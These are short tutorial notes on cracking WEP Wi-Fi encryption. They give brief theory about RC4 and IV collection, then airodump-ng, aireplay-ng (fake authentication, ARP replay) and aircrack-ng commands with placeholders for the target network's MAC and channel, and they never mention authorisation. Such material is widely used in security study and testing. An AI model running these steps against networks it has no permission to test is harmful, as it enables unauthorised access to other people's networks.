//WEP Cracking theory - oldest - but still used
It uses a RC4 algorithm where each packet is encrypted at the AP and then decrypted at the client
IV are in the packets as plain est. So the more IV we collect the more likely we can crack the key.

//WEP Cracking Basic

//First see all networks

airodump-ng mon0

airodump-ng -bssid (MACNETWORKADRESS) --channel (NETWORKCHANNEL) --write basic-test-ap mon0

//Let it collect some data
//Try to crack the network with the data you have connected
// Launch a new terminal

aircrack-ng basic-test-ap-01.cap

//Once it has found the key you just remove the dots in between the characters

//Now you have cracked the WEP key!


//////How to crack WEP when there are no clients or little traffic

//First you must authenticate your device with the router DO THE FOLLOWING ALONG SIDE EACH OTHER

aireplay-ng --fakeauth 0 -a (NETWORKMACADRESS) -h (YOURMACADRESS) mon0

airodump-ng --bssid (NETWORKMACADRESS) --channel (NETWORKCHANNEL) --write arp-request-reply mon0

aireplay-ng --arpreplay -b (NETWORKMACADRESS) -h (YOURMACADRESS) mon0

//Next to crack

aircrack-ng arp-request-reply-01.cap
